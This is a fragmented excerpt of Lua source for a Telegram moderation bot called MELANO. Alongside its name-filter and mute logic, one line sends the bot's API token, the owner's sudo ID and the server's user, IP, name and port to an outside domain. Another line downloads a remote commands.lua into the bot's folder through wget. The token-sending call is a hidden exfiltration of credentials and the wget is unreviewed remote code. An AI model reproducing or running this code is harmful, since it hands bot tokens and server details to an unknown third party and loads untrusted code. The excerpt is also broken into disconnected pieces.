...
local t = json:decode(https.request('https://nbgvy6.ml/ASHTRAKLUA/indexx.php?n=MELANO&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/REXStEaM/Files_MELANO/main/File_Bot/commands.lua") 
...
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."MELANO:blocname"..msg.chat_id_) or ""
...
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."MELANO:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."MELANO:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."MELANO:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."MELANO:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
...
℘︙ [MELANO programmer](t.me/mndzr) 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . [TWS MELANO](t.me/S0DRGbot)     
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
local UserName = (b.username_ or "REXStEaM")
